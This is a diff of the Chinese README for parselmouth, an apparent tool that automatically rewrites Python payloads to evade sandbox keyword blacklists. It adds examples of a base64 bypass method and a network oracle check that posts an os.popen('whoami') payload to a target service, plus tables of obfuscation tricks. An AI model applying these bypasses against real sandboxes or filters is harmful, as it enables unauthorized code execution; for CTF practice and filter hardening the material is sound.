@@ -1,6 +1,8 @@
 # parselmouth
 一个自动化的 Python 沙箱逃逸 payload bypass 框架
 
+English README: [README_EN.md](README_EN.md)
+
 <img alt="image" src="https://github.com/Macr0phag3/parselmouth/blob/master/pic/cases.png">
 
 <img alt="image" src="https://github.com/Macr0phag3/parselmouth/blob/master/pic/main.png">
@@ -56,6 +58,127 @@ print(status, c_result, result)
 - 如果希望通过与目标交互的方式进行 payload 检查，可以改写 check 方法，原则是如果检查通过返回空 `[]`；如果检查不通过的话，最好是返回不通过的字符，如果条件有限，返回任意不为空的列表也可以
 - 对已有的 ast 类型，需要新增不同的处理函数，则需要在 `bypass_tools.py` 中找到对应的 bypass 类型，并新增一个 `by_` 开头的方法。同一个类下的 bypass 函数，使用顺序取决于对应类中定义的顺序，先被定义的函数会优先尝试进行 bypass
 
+#### 自定义 bypass 函数
+以字符串 bypass 为例。假设希望将 `macr0phag3` 转为 base64 解码语句 `__import__('base64').b64decode(b'bWFjcjBwaGFnMw==')`，则可以给 `bypass_tools.py` 的 `Bypass_String` 动态挂一个新的 `by_` 方法：
+
+```python
+import base64
+
+import parselmouth as p9h
+import bypass_tools
+
+
+@bypass_tools.recursion_protect
+def by_base64(self):
+    encoded = base64.b64encode(self.node._value.encode())
+    return self.P9H(
+        f'__import__("base64").b64decode({encoded!r})'
+    ).visit()
+
+
+bypass_tools.Bypass_String.by_base64 = by_base64
+bypass_tools.Bypass_String.by_base64.__qualname__ = "Bypass_String.by_base64"
+
+p9h.BLACK_CHAR = {"kwd": ["mac", "::", "by_char", "bytes", "chr", "dict"]}
+runner = p9h.P9H(
+    "'macr0phag3'",
+    specify_bypass_map={"white": {"Bypass_String": ["by_base64"]}},
+    versbose=2,
+)
+result = runner.visit()
+status, c_result = p9h.color_check(result)
+print(status, c_result, result)
+```
+
+如果希望覆盖自带的 bypass，也可以直接用同样的赋值方式替换已有方法：
+
+```python
+bypass_tools.Bypass_String.by_char = by_base64
+bypass_tools.Bypass_String.by_char.__qualname__ = "Bypass_String.by_char"
+```
+
+定制完 bypass 之后，如果想补测试，可以把 payload、rule、answer 按 `test_case.py` 里现有的格式加进去，再跑：
+
+```bash
+python run_test.py
+```
+
+#### 自定义检查函数
+默认的 `check` 只是本地检查 payload 是否命中黑名单：
+
+```python
+def check(payload, ignore_space=False):
+    if isinstance(payload, ast.AST):
+        payload = ast.unparse(payload)
+
+    return [i for i in BLACK_CHAR if i in str(payload)]
+```
+
+但在真实场景里，payload 往往需要通过网络请求去验证。比如目标是一个 web 应用，此时可以直接改写全局的 `p9h.check`，把目标服务当成 oracle：
+
+```python
+import ast
+import time
+
+import requests
+
+import parselmouth as p9h
+
+
+def check(payload, ignore_space=False):
+    if isinstance(payload, ast.AST):
+        payload = ast.unparse(payload)
+
+    result = requests.post(
+        "http://127.0.0.1:5000/challenge",
+        json={"exp": payload},
+        timeout=5,
+    ).text
+    time.sleep(0.1)  # 防止过快导致 DoS
+    if "hacker" in result:
+        return [result]
+    return []
+
+
+p9h.check = check
+runner = p9h.P9H("__import__('os').popen('whoami').read()", versbose=2)
+result = runner.visit()
+status, c_result = p9h.color_check(result)
+print(status, c_result, result)
+```
+
+这个 `check` 需要遵守一个简单约定：
+- 检查通过时返回空列表 `[]`
+- 检查不通过时返回非空列表；最好把命中的关键字放进去，如果实在拿不到，返回任意非空列表也可以
+
+下面给一个最小的 flask 测试服务例子：
+
+```python
+from flask import Flask, jsonify, request
+
+app = Flask(__name__)
+
+
+@app.route("/challenge", methods=["POST"])
+def check_exp():
+    data = request.json
+    exp = str(data.get("exp"))
+
+    if exp is None:
+        return jsonify({"error": "Missing 'exp' parameter"}), 400
+
+    forbidden_chars = ["'", '"', ".", "popen"]
+    for char in forbidden_chars:
+        if char in exp:
+            return jsonify({"error": "hacker!"}), 400
+
+    return jsonify({"message": "Expression is valid"}), 200
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
+```
+
 
 ## 2. 当前 bypass function
 
@@ -82,18 +205,19 @@ print(status, c_result, result)
 | Bypass_String    | by_format   | `"macr0phag3"` | `'{}{}{}{}{}{}{}{}{}{}'.format(chr(109), chr(97), chr(99), chr(114), chr(48), chr(112), chr(104), chr(97), chr(103), chr(51))`  | format 绕过限制 |
 | Bypass_String    | by_hex_encode   | `"macr0phag3"` | `"\x6d\x61\x63\x72\x30\x70\x68\x61\x67\x33"`  | hex 编码绕过限制 |
 | Bypass_String    | by_unicode_encode   | `"macr0phag3"` | `"\u006d\u0061\u0063\u0072\u0030\u0070\u0068\u0061\u0067\u0033"`  | unicode 编码绕过限制 |
-| Bypass_String    | by_char_format   | `"macr0phag3"` | `"%c%c%c%c%c%c%c%c%c%c%c%c" % (95,95,98,117,105,108,116,105,110,115,95,95)`  | %c format 编码绕过限制 |
-| Bypass_String    | by_char_add   | `"macr0phag3"` | `'m'+'a'+'c'+'r'+'0'+'p'+'h'+'a'+'g'+'3'`  | 字符加法运算绕过限制 |
+| Bypass_String    | by_char_format   | `"macr0phag3"` | `"%c%c%c%c%c%c%c%c%c%c%c%c" % (95,95,98,117,105,108,116,105,110,115,95,95)`  | %c format 编码绕过限制，[@chi111i](https://github.com/chi111i) |
+| Bypass_String    | by_char_add   | `"macr0phag3"` | `'m'+'a'+'c'+'r'+'0'+'p'+'h'+'a'+'g'+'3'`  | 字符加法运算绕过限制，[@chi111i](https://github.com/chi111i) |
 
 |  类   |   方法名  | payload | bypass | 解释说明 |
 | ----- | -------- | ------- | ------- | ----- |
 | Bypass_Name    | by_unicode   | `__import__` | `_＿import_＿` | unicode 绕过|
 | Bypass_Name    | by_builtins   | `__import__` | `__builtins__.__import__` | 从 builtins 获取 name |
 | Bypass_Name    | by_builtin_func_self   | `__import__` | `id.__self__.__import__` | 通过任意 `builtin_function_or_method.__self__` 拿到 builtins，自动选择可用入口 |
+| Bypass_Name    | by_frame   | `__import__` | `(i for i in ()).gi_frame.f_builtins['__import__']` | 通过生成器 frame 的 `f_builtins` 获取 name |
 
 |  类   |   方法名  | payload | bypass | 解释说明 |
 | ----- | -------- | ------- | ------- | ----- |
-| Bypass_Attribute    | by_getattr   | `str.find` | `getattr(str, 'find')` | getattr 绕过|
+| Bypass_Attribute    | by_getattr   | `str.find` | `getattr(str, 'find')` | getattr 绕过，相关思路参考 [@chi111i](https://github.com/chi111i) |
 | Bypass_Attribute    | by_vars   | `str.find` | `vars(str)["find"]` | vars 绕过|
 | Bypass_Attribute    | by_dict_attr   | `str.find` | `str.__dict__["find"]` | `__dict__` 绕过|
 
@@ -107,8 +231,8 @@ print(status, c_result, result)
 
 |  类   |   方法名  | payload | bypass | 解释说明 |
 | ----- | -------- | ------- | ------- | ----- |
-| Bypass_BoolOp    | by_bitwise   | `'yes' if 1 and (2 or 3) or 2 and 3 else 'no'` | `'yes' if 1&(2\|3)\|2&3 else 'no'` | `and/or` 替换成 `&\|` |
-| Bypass_BoolOp    | by_arithmetic   | `'yes' if (__import__ and (2 or 3)) or (2 and 3) else 'no'` | `'yes' if bool(bool(__imp𝒐rt__)*bool(bool(2)+bool(3)))+bool(bool(2)*bool(3)) else 'no'` | `and/or` 替换成基础运算 |
+| Bypass_BoolOp    | by_bitwise   | `'yes' if 1 and (2 or 3) or 2 and 3 else 'no'` | `'yes' if 1&(2\|3)\|2&3 else 'no'` | `and/or` 替换成 `&\|`，[@chi111i](https://github.com/chi111i) |
+| Bypass_BoolOp    | by_arithmetic   | `'yes' if (__import__ and (2 or 3)) or (2 and 3) else 'no'` | `'yes' if bool(bool(__imp𝒐rt__)*bool(bool(2)+bool(3)))+bool(bool(2)*bool(3)) else 'no'` | `and/or` 替换成基础运算，[@chi111i](https://github.com/chi111i) |
 
 
 以及上述所有方法的组合 bypass。
@@ -119,20 +243,9 @@ print(status, c_result, result)
 
 ## 3. TODO
 
-- [x] 支持通过参数 `--re-rule` 来指定正则表达式格式的黑名单规则
-- [x] 支持 payload 字符集合大小限制：目前是贪心算法
-- [x] 打印可用的 bypass 手法
-- [x] 优化 bypass 单元测试
 - [ ] `exec`、`eval` + `open` 执行库代码
-- [x] `'__builtins__'` -> `'\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'`
-- [x] `'__builtins__'` -> `'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'`
-- [x] `"os"` -> `"o" + "s"` [@chi111i](https://github.com/chi111i)
 - [ ] `'__buil''tins__'` -> `str.__add__('__buil', 'tins__')`
-- [x] `'__buil''tins__'` -> `'%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)` [@chi111i](https://github.com/chi111i)
-- [x] `__import__` -> `getattr(__builtins__, "__import__")` [@chi111i](https://github.com/chi111i)
 - [ ] `__import__` -> `__loader__().load_module`
-- [x] `str.find` -> `vars(str)["find"]`  # 注意基础类型 或者 自定义 `__slots__` 没有 `__dict__` 属性
-- [x] `str.find` -> `str.__dict__["find"]`  # 注意基础类型 或者 自定义 `__slots__` 没有 `__dict__` 属性
 - [ ] `",".join("123")` -> `"".__class__.join(",", "123")`
 - [ ] `",".join("123")` -> `str.join(",", "123")`
 - [ ] `"123"[0]` -> `"123".__getitem__(0)`
@@ -143,11 +256,7 @@ print(status, c_result, result)
 - [ ] `1` -> `int(max(max(dict(a၁=()))))`
 - [ ] `[i for i in range(10) if i == 5]` -> `[[i][0]for(i)in(range(10))if(i)==5]`
 - [ ] `==` -> `in`
-- [x] `True or False` -> `(True) | (False)` [@chi111i](https://github.com/chi111i)
 - [ ] ~~`True or False` -> `bool(- (True) - (False))`~~ 感觉不实用
-- [x] `True or False` -> `bool((True) + (False))` [@chi111i](https://github.com/chi111i)
-- [x] `True and False` -> `(True) & (False)` [@chi111i](https://github.com/chi111i)
-- [x] `True and False` -> `bool((True) * (False))` [@chi111i](https://github.com/chi111i)
 - [ ] `[2, 20, 30]` -> `[i for i in range(31) for j in range(31) if i==0 and j == 2 or i == 1 and j ==20 or i == 2 and j == 30]`
 
 ## 4. Others
